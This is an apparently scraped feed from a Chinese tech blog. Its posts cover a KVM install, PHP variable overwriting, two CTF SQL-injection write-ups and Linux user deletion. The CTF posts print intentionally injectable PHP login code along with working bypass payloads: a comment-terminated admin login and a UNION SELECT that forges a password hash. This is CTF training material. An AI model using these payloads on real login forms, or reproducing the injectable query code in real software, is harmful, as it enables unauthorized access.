    <content type="html"><![CDATA[<p><strong>这里使用的是Ubuntu18.04桌面版虚拟机</strong><br>关于KVM可以看一下我<a href="https://www.cnblogs.com/Timesi/p/9565456.html" target="_blank" rel="noopener">之前的博客</a>,有一些简单的介绍。<br>1.在打开虚拟机之前先开启此虚拟机的虚拟化功能。<br><img alt data-src="https://image.3001.net/images/20181123/15429714916274.jpg" class="lozad"><br>2.安装<code>KVM</code>及其依赖项</p><pre><code>wy@wy-virtual-machine:~$ sudo apt install qemu qemu-kvm libvirt-bin bridge-utils  virt-manager</code></pre><p>3.安装完成后，启用<code>libvirtd服务</code>(默认是开启的)</p><pre><code>wy@wy-virtual-machine:~$ sudo service libvirtd startwy@wy-virtual-machine:~$ sudo update-rc.d libvirtd enable</code></pre><p>4.启动之后查看一下<code>libvirtd服务</code>的运行状态</p><pre><code>wy@wy-virtual-machine:~$ service libvirtd status● libvirtd.service - Virtualization daemonLoaded: loaded (/lib/systemd/system/libvirtd.service; enabled; vendor preset:Active: active (running) since Tue 2018-09-18 18:44:55 CST; 1min 56s ago    Docs: man:libvirtd(8)        https://libvirt.orgMain PID: 6006 (libvirtd)    Tasks: 19 (limit: 32768)CGroup: /system.slice/libvirtd.service        ├─6006 /usr/sbin/libvirtd        ├─6701 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default        └─6702 /usr/sbin/dnsmasq --conf-file=/var/lib/libvirt/dnsmasq/default9月 18 18:44:55 wy-virtual-machine systemd[1]: Started Virtualization daemon.9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: started, version 2.79 cachesiz9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: compile time options: IPv6 GNU9月 18 18:45:00 wy-virtual-machine dnsmasq-dhcp[6701]: DHCP, IP range 192.168.129月 18 18:45:00 wy-virtual-machine dnsmasq-dhcp[6701]: DHCP, sockets bound exclu9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: reading /etc/resolv.conf9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: using nameserver 127.0.0.53#539月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: read /etc/hosts - 7 addresses9月 18 18:45:00 wy-virtual-machine dnsmasq[6701]: read /var/lib/libvirt/dnsmasq/9月 18 18:45:00 wy-virtual-machine dnsmasq-dhcp[6701]: read /var/lib/libvirt/dns</code></pre><p>可以看到正在运行。<br>到此<code>KVM</code>安装完成。</p><hr><p>接着就可以创建虚拟机了，首先通过<code>virt-manager</code>命令打开<code>Virtual Machine Manager</code>。<br><img alt data-src="https://image.3001.net/images/20181123/15429714932785.jpg" class="lozad"><br>然后开始新建虚拟机。<br><img alt data-src="https://image.3001.net/images/20181123/15429714952486.jpg" class="lozad"><br>选择镜像<br><img alt data-src="https://image.3001.net/images/20181123/15429714972102.jpg" class="lozad"><br>配置虚拟机规格<br><img alt data-src="https://image.3001.net/images/20181123/15429714981193.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429715015555.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20181123/15429715037544.jpg" class="lozad"><br>接着创建<br><img alt data-src="https://image.3001.net/images/20181123/15429715045047.jpg" class="lozad"><br>然后就好啦。<br><img alt data-src="https://image.3001.net/images/20181123/15429715062667.jpg" class="lozad"></p><ul><li><input checked disabled type="checkbox"> 虚拟机中安装虚拟机达成</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;这里使用的是Ubuntu18.04桌面版虚拟机&lt;/strong&gt;&lt;br&gt;关于KVM可以看一下我&lt;a href=&quot;https://www.cnblogs.com/Timesi/p/9565456.html&quot; target=&quot;_blank&quot; rel=&quot;noope
      
    
    </summary>
    
      <category term="Cloud" scheme="https://www.gubeiqing.cn/categories/Cloud/"/>
    
    
      <category term="Cloud" scheme="https://www.gubeiqing.cn/tags/Cloud/"/>
    
      <category term="虚拟化" scheme="https://www.gubeiqing.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>foreach函数</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/php变量覆盖问题/</id>
    <published>2018-10-08T06:57:06.000Z</published>
    <updated>2019-10-04T04:13:06.910Z</updated>
    
    <content type="html"><![CDATA[<h3 id="foreach函数"><a href="#foreach函数" class="headerlink" title="foreach函数"></a>foreach函数</h3><p>PHP中遍历有一个遍历数组的函数–foreach。<br>foreach有两种用法，一种直接遍历数组然后输出值，另一种不光输出值，还输出与值对应的键。</p><p>第一种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$array = array(&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;);</span><br><span class="line">foreach($array as $values)&#123;</span><br><span class="line">    echo $values;</span><br><span class="line">    echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：<br><img alt data-src="https://image.3001.net/images/20190616/15606672129830.jpg" class="lozad"></p><p>第二种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$array = array(&quot;A&quot;,&quot;B&quot;,&quot;C&quot;,&quot;D&quot;,&quot;E&quot;);</span><br><span class="line">foreach($array as $key =&gt; $values)&#123;</span><br><span class="line">    echo $key.&quot;-&gt;&quot;.$values;</span><br><span class="line">    echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：<br><img alt data-src="https://image.3001.net/images/20190616/15606674259418.jpg" class="lozad"></p><p>如果是关联数组使用第二种方法就可以输出键值对。</p><p>###变量覆盖</p><p><strong>1.$$变量覆盖</strong><br>举个最简单的例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=10;</span><br><span class="line">$array = array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3);</span><br><span class="line">foreach ($array as $key=&gt;$value)  </span><br><span class="line">&#123;</span><br><span class="line">        $$key = $value;</span><br><span class="line">&#125;</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我先定义了一个变量a并初始化为10，查看一下输出：<br><img alt data-src="https://image.3001.net/images/20190616/1560671487540.jpg" class="lozad"><br>发现输出的结果中，变量a的值变成了1，就是因为变量覆盖。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$array = array(&apos;a&apos;=&gt;1,&apos;b&apos;=&gt;2,&apos;c&apos;=&gt;3);</span><br><span class="line">foreach ($array as $key=&gt;$value)  </span><br><span class="line">&#123;</span><br><span class="line">    $$key = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这段语句中，<code>foreach ($array as $key=&gt;$value)</code>输出的key应该是<code>a，b,c</code>,输出的value 应该是<code>1,2,3</code>,但是到下一句之后，使用<code>$$key</code>使得原来的<code>a</code>变成了<code>$a</code>，而value的值没有变化，就使得foreach里面的语句变成了<code>$a=1</code>,<code>$b=2</code>,<code>$c=3</code>，这样一来，<code>$a=1</code>就将之前的<code>$a=10</code>，覆盖了，所以输出的结果是<code>$a=1</code>。</p><p><strong>2.extract()变量覆盖</strong><br>源自<a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">W3school</a>。</p><p>（1）语法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract(array,extract_rules,prefix)</span><br></pre></td></tr></table></figure><p>（2）定义和用法<br>extract() 函数从数组中将变量导入到当前的符号表。<br>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。<br>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。<br>该函数返回成功导入到符号表中的变量数目。</p><p>（3）举例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;Original&quot;;</span><br><span class="line">$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);</span><br><span class="line">extract($my_array);</span><br><span class="line">echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：<br><img alt data-src="https://image.3001.net/images/20190616/15606724931566.jpg" class="lozad"><br>可以看到$a原来的值被覆盖。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;foreach函数&quot;&gt;&lt;a href=&quot;#foreach函数&quot; class=&quot;headerlink&quot; title=&quot;foreach函数&quot;&gt;&lt;/a&gt;foreach函数&lt;/h3&gt;&lt;p&gt;PHP中遍历有一个遍历数组的函数–foreach。&lt;br&gt;foreach有两种用法，
      
    
    </summary>
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/categories/PHP/"/>
    
    
      <category term="CTF" scheme="https://www.gubeiqing.cn/tags/CTF/"/>
    
      <category term="PHP" scheme="https://www.gubeiqing.cn/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SQL注入1</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/CTF-SQL1/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/CTF-SQL1/</id>
    <published>2018-10-08T06:57:06.000Z</published>
    <updated>2019-10-04T04:04:41.834Z</updated>
    
    <content type="html"><![CDATA[<p>题目<br><img alt data-src="https://image.3001.net/images/20190615/15605755361556.jpg" class="lozad"></p><p>访问题目网址<br><img alt data-src="https://image.3001.net/images/20190615/15605756298441.jpg" class="lozad"></p><p>先查看一下源码<br><img alt data-src="https://image.3001.net/images/20190615/15605756914304.jpg" class="lozad"></p><p>仔细分析一下核心源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;      //判断user和pass两个变量不为空</span><br><span class="line">mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);        //连接数据库</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);    //选择要使用的库</span><br><span class="line">  $user = trim($_POST[user]);       //去除输入的user变量两侧的空白字符</span><br><span class="line">  $pass = md5(trim($_POST[pass]));  //去除pass变量两侧空白字符再进行md5加密</span><br><span class="line">  $sql=&quot;select user from ctf where (user=&apos;&quot;.$user.&quot;&apos;) and (pw=&apos;&quot;.$pass.&quot;&apos;)&quot;;    //根据输入的user和pass构造查询语句</span><br><span class="line">    echo &apos;&lt;/br&gt;&apos;.$sql;  //回显查找语句</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));    //使用构造的查询语句查询数据库并返回结果集</span><br><span class="line">  if($query[user]==&quot;admin&quot;) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  if($query[user] != &quot;admin&quot;) &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;         //判断结果集中的user参数对应的值是不是admin，如果是返回flag，不是则返回 You are not admin!</span><br><span class="line">&#125;</span><br><span class="line">echo $query[user];      //回显查询到的user值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过分析源码知道了<code>user</code>的值为<code>admin</code>,因为sql查询语句里有and，必须and前后同时成立才可以查询，但是现在不知道<code>pass</code>对应的值，所以考虑能不能不判断pass，直接判断user，于是想到是不是可以将user判断语句闭合并注释后面的内容，这样就不会对pass进行判断，pass就直接输入<code>111</code>，于是构造下面的语句。<br><img alt data-src="https://image.3001.net/images/20190615/15605774891410.jpg" class="lozad"><br>这样的话查询语句就变成了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select user from ctf where (user=&apos;admin&apos;) #&apos;) and (pw=&apos;111&apos;)</span><br></pre></td></tr></table></figure><p>尝试提交看看会不会返回flag。<br><img alt data-src="https://image.3001.net/images/20190615/15605783011325.jpg" class="lozad"><br>成功拿到flag</p><blockquote><p>补充：Mysql的注释语句有三种<br>1./**/<br>注释一段内容，这里明显不适用。<br>2.–<br>注释– 后的语句直到行尾，注意这里的–后面要有一个空格，但是题目中使用了trim()函数去除空格，所以也不适用。<br>3.#<br>注释#后的语句直到行尾。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目&lt;br&gt;&lt;img alt data-src=&quot;https://image.3001.net/images/20190615/15605755361556.jpg&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问题目网址&lt;br&gt;&lt;img alt data-src=&quot;ht
      
    
    </summary>
    
      <category term="CTF" scheme="https://www.gubeiqing.cn/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://www.gubeiqing.cn/tags/CTF/"/>
    
      <category term="MySQL" scheme="https://www.gubeiqing.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>CTF-SQL注入2</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/CTF-SQL%E6%B3%A8%E5%85%A52/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/CTF-SQL注入2/</id>
    <published>2018-10-08T06:57:06.000Z</published>
    <updated>2019-10-04T04:04:37.253Z</updated>
    
    <content type="html"><![CDATA[<p>题目<br><img alt data-src="https://image.3001.net/images/20190615/15605824628676.jpg" class="lozad"></p><p>访问题目网址<br><img alt data-src="https://image.3001.net/images/20190615/15605825721507.jpg" class="lozad"></p><p>还是先查看一下源码<br><img alt data-src="https://image.3001.net/images/20190615/15605833271628.jpg" class="lozad"></p><p>分析核心源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">   mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;));</span><br><span class="line">  if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>找到最关键的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>解题思路：<br>1.可以看到这里只对密码进行了对比，没有进行user的对比，所以应该考虑怎么使得<code>$query[pw]</code>存在且<code>strcasecmp($pass, $query[pw]))</code>为假。</p><p>2.<code>$query[pw]</code>是MySQL查询结果集中的值，只要MySQL语句返回值即可存在。<br>要使<code>strcasecmp($pass, $query[pw])</code>为假，就要使得<code>$pass</code>的值小于等于<code>$query[pw]</code>（比较ASCII码）。<code>$pass</code>是我们输入值的md5值，<code>$query[pw]</code>是数据库中的正确密码。因为<code>$pass</code>是md5值，32位，而<code>$query[pw]</code>不知道，所以看看能不能将<code>$query[pw]</code>的值构造成我们需要的32位，且大于<code>$pass</code>的值，根据题目的提示，考察union联合查询，尝试构造如下语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select pw from ctf where user=&apos;&apos;union select md5(2)#&apos;</span><br></pre></td></tr></table></figure><p>这个语句的输出因为闭合了user，user为空，查不到任何值，而后面<code>select md5(2)</code>，则会返回2的md5值，所以返回的结果会变成下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----------------------------------+</span><br><span class="line">| pw                               |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| c81e728d9d4c2f636f067f89cc14862c |</span><br><span class="line">+----------------------------------+</span><br></pre></td></tr></table></figure><p>这样从<code>$query[pw]</code>查询到的值就会变成2的md5值，这时我密码输入2，这样经过<code>strcasecmp()</code>函数的对比会返回0，达到目的。<br><img alt data-src="https://image.3001.net/images/20190615/15605875962836.jpg" class="lozad"><br><img alt data-src="https://image.3001.net/images/20190615/15605876277562.jpg" class="lozad"><br>成功拿到flag</p><hr><p><strong>补充：</strong><br><strong>1.<code>strcasecmp(str1，str2)</code>函数</strong></p><p><code>strcasecmp(str1，str2)</code>函数返回的结果是比较两个字符串的ASCII码，从第一位开始，相等就比较下一位，如果比较过程中，一旦出现str1的某一个字符的ASCII码和str2的不等，那么将返回这两个字符的ASCII码值之差。<br><img alt data-src="https://image.3001.net/images/20190615/15605881881011.jpg" class="lozad"></p><p><strong>2.union联合查询</strong><br>当使用union联合查询时，前一个select查询的列名将会作为输出结果的列名，后一个select只会返回查询列的内容，而没有列名。</p><p>union前后查询列名一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from t2;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | score |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 |    33 |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from t5;</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">| user      | pw      | id   |</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">| admin     | 000000  | NULL |</span><br><span class="line">| admin2    | 1000000 | NULL |</span><br><span class="line">| gubeiqing | gu      |   10 |</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id from t2 union select id from t5;</span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">|    1 |</span><br><span class="line">| NULL |</span><br><span class="line">|   10 |</span><br><span class="line">+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>union前后查询列名不一致</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from t2;</span><br><span class="line">+----+-------+</span><br><span class="line">| id | score |</span><br><span class="line">+----+-------+</span><br><span class="line">|  1 |    33 |</span><br><span class="line">+----+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from t5;</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">| user      | pw      | id   |</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">| admin     | 000000  | NULL |</span><br><span class="line">| admin2    | 1000000 | NULL |</span><br><span class="line">| gubeiqing | gu      |   10 |</span><br><span class="line">+-----------+---------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select id from t2 union select pw from t5;</span><br><span class="line">+---------+</span><br><span class="line">| id      |</span><br><span class="line">+---------+</span><br><span class="line">| 1       |</span><br><span class="line">| 000000  |</span><br><span class="line">| 1000000 |</span><br><span class="line">| gu      |</span><br><span class="line">+---------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;题目&lt;br&gt;&lt;img alt data-src=&quot;https://image.3001.net/images/20190615/15605824628676.jpg&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
&lt;p&gt;访问题目网址&lt;br&gt;&lt;img alt data-src=&quot;ht
      
    
    </summary>
    
      <category term="CTF" scheme="https://www.gubeiqing.cn/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://www.gubeiqing.cn/tags/CTF/"/>
    
      <category term="MySQL" scheme="https://www.gubeiqing.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Linux下完全删除用户</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/linux02/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/linux02/</id>
    <published>2018-10-08T06:54:33.000Z</published>
    <updated>2019-10-04T05:50:05.519Z</updated>
    
    <content type="html"><![CDATA[<p><strong>实验环境：Centos7虚拟机</strong><br>首先创建一个普通用户<code>gubeiqing</code>。</p><pre><code>[root@localhost ~]# useradd gubeiqing[root@localhost ~]# passwd gubeiqingChanging password for user gubeiqing.New password:BAD PASSWORD: The password is a palindromeRetype new password:passwd: all authentication tokens updated successfully.</code></pre><p>这样就成功创建了一个普通用户，然后来删除这个用户。</p><pre><code>[root@localhost ~]# userdel gubeiqing[root@localhost ~]#</code></pre><p>使用<code>useradd</code>命令就删除了，但是，，，问题来了，当我们再次创建<code>gubeiqing</code>这个用户时：</p><pre><code>[root@localhost ~]# useradd gubeiqinguseradd: warning: the home directory already exists.Not copying any file from skel directory into it.Creating mailbox file: File exists</code></pre><p>文件已存在，无法创建，这是为什么？因为在创建用户时会默认生成用户的<code>家目录</code>，<code>密码文件</code>，<code>用户组</code>(不指定用户组的情况下)，以及<code>邮箱文件</code>，而使用<code>userdel</code>命令删除时仅仅是删除了这个用户，而这个用户的文件还在，那么就需要完全删除这些文件。我看了一下大概有四个地方需要处理。</p><ul><li>在<code>/home</code>目录下的文件</li><li>在<code>/etc/passwd</code>下的用户</li><li>在<code>/etc/group</code>下的用户组</li><li>在<code>/var/spool/mail</code>下的邮箱文件</li></ul><p>下面依次来删除这些文件。</p><p>#1.删除<code>/home</code>目录下的文件</p><pre><code>[root@localhost ~]# cd /home[root@localhost home]# lsgubeiqing[root@localhost home]# rm -rf gubeiqing[root@localhost home]# ls[root@localhost home]#</code></pre><p>#2.删除<code>/etc/passwd</code>下的用户<br>我们可以查看一下这个文件。</p><pre><code>[root@localhost ~]# cat /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinsystemd-network:x:192:192:systemd Network Management:/:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinpolkitd:x:999:997:User for polkitd:/:/sbin/nologinpostfix:x:89:89::/var/spool/postfix:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinchrony:x:998:996::/var/lib/chrony:/sbin/nologindockerroot:x:997:994:Docker User:/var/lib/docker:/sbin/nologingubeiqing:x:1000:1000::/home/gubeiqing:/bin/bash</code></pre><p>在这里可以看到这个系统中的所有用户，可以看到最后一行就是刚刚创建的用户，那么使用<code>vi</code>编辑器删除最后一行的用户。</p><p>#3.删除<code>/etc/group</code>下的用户组文件<br>先查看一下这个文件：</p><pre><code>[root@localhost ~]# cat /etc/grouproot:x:0:bin:x:1:daemon:x:2:sys:x:3:adm:x:4:tty:x:5:disk:x:6:lp:x:7:mem:x:8:kmem:x:9:wheel:x:10:cdrom:x:11:mail:x:12:postfixman:x:15:dialout:x:18:floppy:x:19:games:x:20:tape:x:30:video:x:39:ftp:x:50:lock:x:54:audio:x:63:nobody:x:99:users:x:100:utmp:x:22:utempter:x:35:ssh_keys:x:999:input:x:998:systemd-journal:x:190:systemd-network:x:192:dbus:x:81:polkitd:x:997:postdrop:x:90:postfix:x:89:sshd:x:74:chrony:x:996:cgred:x:995:dockerroot:x:994:gubeiqing:x:1000:</code></pre><p>然后使用<code>vi</code>编辑器删除这个用户组。</p><p>#4.删除<code>/var/spool/mail</code>下的邮箱文件</p><pre><code>[root@localhost ~]# cd /var/spool/mail[root@localhost mail]# lsgubeiqing[root@localhost mail]# rm -rf gubeiqing[root@localhost mail]# ls[root@localhost mail]#</code></pre><p>删除完成，再来创建<code>gubeiqing</code>用户。</p><pre><code>[root@localhost mail]# useradd gubeiqing[root@localhost mail]# passwd gubeiqingChanging password for user gubeiqing.New password:BAD PASSWORD: The password is a palindromeRetype new password:passwd: all authentication tokens updated successfully.</code></pre><p>搞定！</p><p><strong>除了这种方法还有一种完全删除的方法。</strong></p><pre><code>[root@localhost mail]# userdel -rf gubeiqing[root@localhost mail]# useradd gubeiqing[root@localhost mail]# passwd gubeiqingChanging password for user gubeiqing.New password:BAD PASSWORD: The password is a palindromeRetype new password:passwd: all authentication tokens updated successfully.</code></pre><p>使用这两种方法就可以完全删除用户。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;实验环境：Centos7虚拟机&lt;/strong&gt;&lt;br&gt;首先创建一个普通用户&lt;code&gt;gubeiqing&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@localhost ~]# useradd gubeiqing
[root@localhos
      
    
    </summary>
    
      <category term="Linux" scheme="https://www.gubeiqing.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://www.gubeiqing.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>MySQL用户远程登录问题</title>
    <link href="https://www.gubeiqing.cn/2018/10/08/mysql04/"/>
    <id>https://www.gubeiqing.cn/2018/10/08/mysql04/</id>
